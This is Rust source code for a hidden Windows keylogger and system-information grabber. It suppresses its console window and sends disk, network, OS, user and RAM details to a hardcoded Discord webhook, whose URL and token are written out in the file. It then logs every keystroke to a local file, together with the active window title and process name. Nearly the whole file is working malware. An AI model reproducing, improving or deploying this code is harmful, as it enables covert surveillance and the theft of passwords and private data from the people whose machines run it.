#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

mod win_key_codes;

#[cfg(windows)]
extern crate winapi;


const WEB_HOOK: &str = "https://discord.com/api/webhooks/1001788489257467904/WUDJq8kg46iyg419qrAezJJFc_O5mQi2drd8fHS2Uqu_5PBZmh5Ty4tfZXSN8Unu12S9";


use std::fmt::format;
use std::fs::*;
use std::io::*;
use futures::prelude::*;
use tokio::runtime::Runtime;

use serenity::{http::Http, model::webhook::Webhook};
use chrono::{DateTime, Timelike, Utc};
use sysinfo::{DiskExt, NetworkExt, ProcessExt, System, SystemExt, UserExt};



async fn sendToMyDC(msg:String)  -> Result<()>{
    let time: DateTime<Utc> = Utc::now();
    let date = format!("{:02}h:{:02}m", time.hour()+2, time.minute());
    println!("sending");
    let http = Http::new("WUDJq8kg46iyg419qrAezJJFc_O5mQi2drd8fHS2Uqu_5PBZmh5Ty4tfZXSN8Unu12S9");
    let webhook = Webhook::from_url(&http, WEB_HOOK).await.expect("Replace the webhook with your own");

    webhook
        .execute(&http, false, |w|{ w.content(msg).username(format!("grebber: {}", date)) } )
        .await
        .expect("could not work :(");


    Ok(())
}


#[cfg(windows)]
fn log_header(file: &mut File) {

    let time: DateTime<Utc> = Utc::now();

    let mut sys = System::new_all();
    sys.refresh_all();

    //start tokio
    let rt = Runtime::new().unwrap();


    let write: String = format!("date: {} current time = {:02}h:{:02}m:{:02}s\nOS info:\n", time.date_naive(), time.hour()+2, time.minute(), time.second());



    // We display all disks' information:
    let mut diskPrint = format!("\n=> disks:\n");
    for disk in sys.disks() {
        diskPrint += &*format!("name: {:?}, type: {:?},is removable: {:?}, filesystem: {:?} space: {:?}GB / {:?}GB, mountpoint: {:?}\n", disk.name(), disk.type_(), disk.is_removable(), String::from_utf8_lossy(disk.file_system()), disk.available_space() / (1024 * 1024 * 1024), disk.total_space() / (1024 * 1024 * 1024), disk.mount_point());
    }
    println!("{}",diskPrint);

    rt.block_on(sendToMyDC(diskPrint)).expect("fuck tokio ");

    // Network interfaces name, data received and data transmitted:
    let mut netW = format!("\n=> networks:\n");
    for (interface_name, data) in sys.networks() {
        netW += &*format!("{}: (r){}/(w){} B\n", interface_name, data.received(), data.transmitted());
    }
    println!("{}",netW);
    rt.block_on(sendToMyDC(netW)).expect("fuck tokio ");

    // Components temperature:
    let mut temp = format!("\n=> components:\n");
    for component in sys.components() {
        temp += &*format!("{:?}\n", component);
    }
    println!("{}",temp);
    rt.block_on(sendToMyDC(temp)).expect("fuck tokio ");

    let mut systemInfo:String = format!("\n=> system:\n");
    // Display system information:
    systemInfo += &*format!("System name:             {:?}\n", sys.name());
    systemInfo += &*format!("System kernel version:   {:?}\n", sys.kernel_version());
    systemInfo += &*format!("System OS version:       {:?}\n", sys.os_version());
    systemInfo += &*format!("System host name:        {:?}\n", sys.host_name());
    systemInfo += &*format!("\nNB CPUs: {}\n", sys.cpus().len());
    for user in sys.users() {
        systemInfo += &*format!("{} is in {} groups \n", user.name(), user.groups().len());
    }
    println!("{}", systemInfo);
    rt.block_on(sendToMyDC(systemInfo)).expect("fuck tokio ");

    // RAM and swap information:
    let mut ramInfo:String = format!("\n=> Ram:\n");
    ramInfo += &*format!("total memory: {} MB\n", sys.total_memory()  / (1024 * 1024 ));
    ramInfo += &*format!("used memory : {} MB\n", sys.used_memory()/ (1024 * 1024 ));
    ramInfo += &*format!("total swap  : {} MB\n", sys.total_swap()/ (1024 * 1024 ));
    ramInfo += &*format!("used swap   : {} MB\n", sys.used_swap()/ (1024 * 1024 ));

    println!("{}", ramInfo);
    rt.block_on(sendToMyDC(ramInfo)).expect("fuck tokio ");

    // Display processes ID, name na disk usage:
    let mut proc:String = format!("\n\n=> Processes:\n");

    for (pid, process) in sys.processes() {
        proc += &*format!("[{}] {} {:?}\n", pid, process.name(), process.disk_usage());
    }

    file.write(write.as_bytes()).expect("help i am broken");
    file.write(proc.as_bytes()).expect("help i am broken at proc");
    file.write(b"--- Start of Logging ---\n").expect("TODO: panic message");
}


#[cfg(not(windows))]
fn log_write(file: &mut File, s: String){

}






#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::*;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::shared::minwindef::DWORD;
    use winapi::ctypes::c_int;
    use std::{thread, time::Duration};


    log_header(file);

    loop{
        thread::sleep(Duration::from_millis(10));

        let hwnd = unsafe { GetForegroundWindow() };

        let pid = unsafe {
            let mut p = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let filename = unsafe {
            const LEN: u32 = 256;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);

            //find the null terminator
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("__NO_TITLE__");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };

        let now: DateTime<Utc> = Utc::now();

        for i in 0 as c_int..255 as c_int {
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                now.hour(), now.minute(), now.second(),
                                filename.trim(), title.trim(), win_key_codes::keycode_to_string(i as u8));

                log(file, s);
            }
        }
    }
}

fn log(file: &mut File, s: String) {
    #[cfg(debug_assertions)] {
        print!("{}", s);
    }

    match file.write(s.as_bytes()) {
        Err(e) => { println!("Couldn't write to log file: {}", e) }
        _ => {}
    }

    match file.flush() {
        Err(e) => { println!("Couldn't flush log file: {}", e) }
        _ => {}
    }
}


fn main() {

    let now: DateTime<Utc> = Utc::now();
    let filename = format!("log-{}-{:02}+{:02}+{:02}.log", now.date_naive(), now.hour(), now.minute(), now.second());

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => { f }

            Err(e) => {
                panic!("Couldn't create Output file: {}", e);
            }
        }
    };

    run(&mut output);
}




